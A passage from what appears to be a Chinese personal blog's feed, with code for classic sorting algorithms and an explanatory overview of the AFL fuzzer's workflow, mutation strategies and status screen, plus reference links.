class="keyword">sizeof</span>(*arr);</span><br><span class="line">    bubble_sort(arr, len);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-选择排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-选择排序font"></a> <font color="navy"><code>0x01 选择排序</code></font></h3><p><img src="/images/146-4.jpg" alt></p><h4 id="1算法思想-2"><a class="markdownIt-Anchor" href="#1算法思想-2"></a> <code>1.算法思想</code></h4><blockquote><p>它的工作原理如下。首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p></blockquote><h4 id="2图解算法-2"><a class="markdownIt-Anchor" href="#2图解算法-2"></a> <code>2.图解算法</code></h4><p><img src="/images/146-3.gif" alt></p><h4 id="3算法实现-2"><a class="markdownIt-Anchor" href="#3算法实现-2"></a> <code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span> <span class="comment">//交換兩個變數</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selection_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; len - <span class="number">1</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++)     <span class="comment">//走訪未排序的元素</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min])    <span class="comment">//找到目前最小值</span></span><br><span class="line">                min = j;    <span class="comment">//紀錄最小值</span></span><br><span class="line">        swap(&amp;arr[min], &amp;arr[i]);    <span class="comment">//做交換</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4算法分析"><a class="markdownIt-Anchor" href="#4算法分析"></a> <code>4.算法分析</code></h4><p>表现最稳定的排序算法之一，因为无论什么数据进去都是O(n2)的时间复杂度，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。</p><h3 id="font-color-navy0x02-插入排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-插入排序font"></a> <font color="navy"><code>0x02 插入排序</code></font></h3><h4 id="1算法思想-3"><a class="markdownIt-Anchor" href="#1算法思想-3"></a> <code>1.算法思想</code></h4><blockquote><p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p></blockquote><h4 id="2图解算法-3"><a class="markdownIt-Anchor" href="#2图解算法-3"></a> <code>2.图解算法</code></h4><p><img src="/images/146-5.gif" alt></p><h4 id="3算法实现-3"><a class="markdownIt-Anchor" href="#3算法实现-3"></a> <code>3.算法实现</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> preIndex, current;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        preIndex = i - <span class="number">1</span>;</span><br><span class="line">        current = arr[i];</span><br><span class="line">        <span class="keyword">while</span>(preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</span><br><span class="line">            arr[preIndex + <span class="number">1</span>] = arr[preIndex];</span><br><span class="line">            preIndex--;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-算法分析"><a class="markdownIt-Anchor" href="#4-算法分析"></a> <code>4 算法分析</code></h4><p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><h3 id="0x03-希尔排序"><a class="markdownIt-Anchor" href="#0x03-希尔排序"></a> <code>0x03 希尔排序</code></h3><h4 id="1算法思想-4"><a class="markdownIt-Anchor" href="#1算法思想-4"></a> <code>1.算法思想</code></h4><blockquote><p><strong>希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。</strong></p></blockquote><p>简单插入排序很循规蹈矩，不管数组分布是怎么样的，依然一步一步的对元素进行比较，移动，插入，比如[5,4,3,2,1,0]这种倒序序列，数组末端的0要回到首位置很是费劲，比较和移动元素均需n-1次。而<strong>希尔排序在数组中采用跳跃式分组的策略</strong>，通过某个增量将数组元素划分为若干组，然后分组进行插入排序，随后逐步缩小增量，继续按组进行插入排序操作，直至增量为1。希尔排序通过这种策略使得整个数组在初始阶段达到从宏观上看基本有序，小的基本在前，大的基本在后。然后缩小增量，到增量为1时，其实多数情况下只需微调即可，不会涉及过多的数据移动。</p><h4 id="2图解算法-4"><a class="markdownIt-Anchor" href="#2图解算法-4"></a> <code>2.图解算法</code></h4><p><img src="/images/146-6.png" alt></p><center>图一</center><p><img src="/images/146-7.gif" alt></p><center>图二</center><h4 id="3算法实现-4"><a class="markdownIt-Anchor" href="#3算法实现-4"></a> <code>3.算法实现</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellSort</span><span class="params">(a)</span>:</span></span><br><span class="line">    length = len(a)</span><br><span class="line">    gap = length // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gap:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(gap, length):</span><br><span class="line">            j = i</span><br><span class="line">            <span class="keyword">while</span> (j-gap) &gt;= <span class="number">0</span> <span class="keyword">and</span> a[j] &lt; a[j-gap]:</span><br><span class="line">                temp = a[j-gap]</span><br><span class="line">                a[j-gap] = a[j]</span><br><span class="line">                a[j] = temp</span><br><span class="line">                j -= gap</span><br><span class="line">        gap = gap // <span class="number">2</span></span><br><span class="line">    print(<span class="string">"[+] "</span>,a)</span><br></pre></td></tr></table></figure><h4 id="4算法分析-2"><a class="markdownIt-Anchor" href="#4算法分析-2"></a> <code>4.算法分析</code></h4><blockquote><p>希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。</p></blockquote><h3 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> <code>参考文献</code></h3><p><a href="https://www.cnblogs.com/onepixel/p/7674659.html" target="_blank" rel="noopener">十大经典排序算法（动图演示）</a></p><p><a href="https://www.cnblogs.com/chengxiao/p/6104371.html" target="_blank" rel="noopener">图解排序算法(二)之希尔排序</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-orangec-排序算法font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-orangec-排序算法font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;orange&quot;&gt;&lt;code&gt;C 排序算法
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>AFL详细总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/08/25/2020.08.24%EF%BC%88145%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/25/2020.08.24（145）/</id>
    <published>2020-08-24T16:00:00.000Z</published>
    <updated>2020-09-02T03:03:00.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-afl的流程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-afl的流程font"></a> <font color="navy"><code>0x00 AFL的流程</code></font></h3><p><img src="/images/145-1.jpg" alt></p><h4 id="font-color-blue1afl整体框架font"><a class="markdownIt-Anchor" href="#font-color-blue1afl整体框架font"></a> <font color="blue"><code>1.AFL整体框架</code></font></h4><blockquote><ol><li><p>main函数先进行初始化和选项处理；</p></li><li><p>执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</p></li><li><p>通过cull_queue对queue进行精选，减小input的量；</p></li><li><p>然后进行while(1)循环不断进行fuzz。</p></li></ol><p>每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</p><ol><li><p>cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored</p></li><li><p>判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</p></li><li><p>fuzz queue_cur对应的input文件；</p></li><li><p>判断是否结束，并更新queue_cur和current_entry；</p></li></ol><p>当队列中的所有文件都经过变异测试了，则完成一次”cycle done”;<br>整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</p></blockquote><h4 id="font-colorblue2afl的fuzz策略font"><a class="markdownIt-Anchor" href="#font-colorblue2afl的fuzz策略font"></a> <font color="blue"><code>2.AFL的fuzz策略</code></font></h4><blockquote><p>总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ol><li><p>bitflip，按位翻转，1变为0，0变为1</p></li><li><p>arithmetic，整数加/减算术运算</p></li><li><p>interest，把一些特殊内容替换到原文件中</p></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p></li></ol><p>其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p><code>bitflip变异</code>：拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</li></ul><p><code>effector map的生成</code>：</p><p>完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><ul><li>bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p><code>arithmetic变异</code>：</p><ul><li>arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><p><code>interest变异</code>：</p><ul><li>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>其中interest value的值在config.h已经设定好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line">&gt;   <span class="number">-128</span>,         <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span><br><span class="line">&gt;   <span class="number">-1</span>,           <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">0</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">1</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">16</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">32</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">64</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">100</span>,          <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">127</span>           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</p><p><code>dictionary变异</code>：</p><ul><li>user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</li><li>user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</li><li>auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</li></ul><p><code>tokens</code>：</p><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</p><p><code>havoc变异</code>：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><h4 id="font-color-blue3bitmapfont"><a class="markdownIt-Anchor" href="#font-color-blue3bitmapfont"></a> <font color="blue"><code>3.Bitmap</code></font></h4><p><img src="/images/145-3.png" alt></p><h3 id="font-colornavy0x01-afl界面介绍font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-afl界面介绍font"></a> <font color="navy"><code>0x01 AFL界面介绍</code></font></h3><p><img src="/images/145-2.png" alt></p><p><code>process timing</code></p><blockquote><p>展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。</p></blockquote><p><code>overall results</code></p><blockquote><p>这里包括运行的总周期数、总路径数、崩溃次数、超时次数。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing。</p></blockquote><p><code>cycle progress</code></p><blockquote><p>该部分展示了当前cycle的队列中fuzzer的距离、当前工作的测试用例的ID</p></blockquote><p><code>Map coverage</code></p><blockquote><p>该部分的第一行介绍了碰撞的分支元组，与bitmap成正比；数字的左半部分是当前的输入，右半部分是整个语料库的值。</p></blockquote><p><code>Stage progress</code></p><blockquote><p>这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</p></blockquote><h3 id="font-colornavy0x02-afl的相关计算font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-afl的相关计算font"></a> <font color="navy"><code>0x02 AFL的相关计算</code></font></h3><h4 id="font-color-blue1覆盖率计算font"><a class="markdownIt-Anchor" href="#font-color-blue1覆盖率计算font"></a> <font color="blue"><code>1.覆盖率计算</code></font></h4><h3 id="font-color-navy0x03-源码分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-源码分析font"></a> <font color="navy"><code>0x03 源码分析</code></font></h3><h3 id="font-color-navyafl-相关文章font"><a class="markdownIt-Anchor" href="#font-color-navyafl-相关文章font"></a> <font color="navy"><code>AFL 相关文章</code></font></h3><p><strong>安装使用</strong></p><ol><li>AFL入门<br><a href="https://www.cnblogs.com/0xHack/p/9414444.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xHack/p/9414444.html</a></li><li>[原创][新手向] 使用AFL来fuzz upx<br><a href="https://bbs.pediy.com/thread-249179.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249179.htm</a></li><li>[翻译]使用AFL进行fuzz<br><a href="https://bbs.pediy.com/thread-250866.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250866.htm</a></li><li>AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing<br><a href="https://paper.seebug.org/841/" target="_blank" rel="noopener">https://paper.seebug.org/841/</a></li><li>AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率<br><a href="https://paper.seebug.org/842/" target="_blank" rel="noopener">https://paper.seebug.org/842/</a></li><li>afl-fuzz技术初探<br><a href="https://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8280352.html</a></li><li>AFL使用指南<br><a href="http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/</a></li><li>Fuzz Testing with afl-fuzz (American Fuzzy Lop)<br><a href="https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/" target="_blank" rel="noopener">https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/</a></li></ol><p><strong>白皮书及文档翻译</strong></p><ol><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（一）——使用初体验<br><a href="https://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/45696317</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（二）——详细使用说明（README.txt ）<br><a href="https://blog.csdn.net/youkawa/article/details/76405468" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76405468</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（三）——技术白皮书（technical whitepaper）<br><a href="https://blog.csdn.net/youkawa/article/details/76615480" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76615480</a></li><li>afl技术白皮书笔记(1)<br><a href="https://ljie.space/2018/01/22/afl%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6%E7%AC%94%E8%AE%B0-1/" target="_blank" rel="noopener">https://ljie.space/2018/01/22/afl技术白皮书笔记-1/</a></li><li>afl-fuzz技术白皮书<br><a href="https://blog.csdn.net/gengzhikui1992/article/details/50844857" target="_blank" rel="noopener">https://blog.csdn.net/gengzhikui1992/article/details/50844857</a></li></ol><p><strong>技术分析</strong></p><ol><li>★★ 漏洞挖掘技术之 AFL 项目分析<br><a href="https://bbs.pediy.com/thread-249912.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249912.htm</a></li><li>[原创]afl-fuzz源码情景分析，详细读码笔记，freemind版本和word版本<br><a href="https://bbs.pediy.com/thread-218671.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218671.htm</a></li><li>AFL技术实现分析<br><a href="https://blog.csdn.net/qq_32464719/article/details/80592902#comments" target="_blank" rel="noopener">https://blog.csdn.net/qq_32464719/article/details/80592902#comments</a></li><li>★★ AFL内部实现细节小记<br><a href="http://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">http://rk700.github.io/2017/12/28/afl-internals/</a></li><li>★★ AFL文件变异一览<br><a href="http://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">http://rk700.github.io/2018/01/04/afl-mutations/</a></li><li>AFL改进小试<br><a href="http://rk700.github.io/2018/02/02/afl-enhancement/" target="_blank" rel="noopener">http://rk700.github.io/2018/02/02/afl-enhancement/</a></li><li>★★ AFL-fuzz工具分析<br><a href="https://blog.csdn.net/Chen_zju/article/details/80791268" target="_blank" rel="noopener">https://blog.csdn.net/Chen_zju/article/details/80791268</a></li><li>AFL源码分析笔记(一)<br><a href="https://xz.aliyun.com/t/4628" target="_blank" rel="noopener">https://xz.aliyun.com/t/4628</a></li><li>AFL源码分析1——afl-gcc.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/05/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901%E2%80%94%E2%80%94afl-gcc-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/05/AFL源码分析1——afl-gcc-c源码分析/</a></li><li>AFL源码分析2——afl-as.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902%E2%80%94%E2%80%94afl-as-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/06/AFL源码分析2——afl-as-c源码分析/</a></li><li>AFL源码分析3——afl-as.h源码分析<br><a href="https://ch4r1l3.github.io/2019/03/08/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%903%E2%80%94%E2%80%94afl-as-h%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/08/AFL源码分析3——afl-as-h源码分析/</a></li><li>AFL源码分析4——afl-fuzz.c源码分析1<br><a href="https://ch4r1l3.github.io/2019/03/09/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%904%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/09/AFL源码分析4——afl-fuzz-c源码分析1/</a></li><li>AFL源码分析5——afl-fuzz.c源码分析2<br><a href="https://ch4r1l3.github.io/2019/03/10/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%905%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/10/AFL源码分析5——afl-fuzz-c源码分析2/</a></li><li>afl fuzzer 源代码阅读<br><a href="https://www.cnblogs.com/jg01/p/9772700.html" target="_blank" rel="noopener">https://www.cnblogs.com/jg01/p/9772700.html</a></li><li>AFL不同文件结构<br><a href="https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/" target="_blank" rel="noopener">https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/</a></li><li>Fuzzing workflows; a fuzz job from start to finish<br><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/" target="_blank" rel="noopener">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></li></ol><p><strong>AFL 项目</strong></p><ol><li>AFL最原始版本,源码地址<br><a href="https://github.com/google/AFL" target="_blank" rel="noopener">https://github.com/google/AFL</a></li><li>[翻译]AFL生态圈 (这篇文章有很多关于AFL的开源项目地址和简单介绍）<br><a href="https://bbs.pediy.com/thread-251051.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251051.htm</a></li><li>AFLplusplus(该工具做了一些集成)<br><a href="https://github.com/vanhauser-thc/AFLplusplus" target="_blank" rel="noopener">https://github.com/vanhauser-thc/AFLplusplus</a></li><li>[分享]关于 fuzz 的 一点总结<br><a href="https://bbs.pediy.com/thread-249986.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249986.htm</a></li></ol><p><a href="https://www.jianshu.com/p/cc7a486e5adb" target="_blank" rel="noopener">(译)afl-fuzz白皮书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-afl的流程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-afl的流程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="AFL" scheme="https://muzibing.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>网路安全学习库</title>
    <link href="https://muzibing.github.io/2020/08/23/2020.08.23%EF%BC%88144%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/23/2020.08.23（144）/</id>
    <published>2020-08-22T16:00:00.000Z</published>
    <updated>2020-09-13T03:34:30.869Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 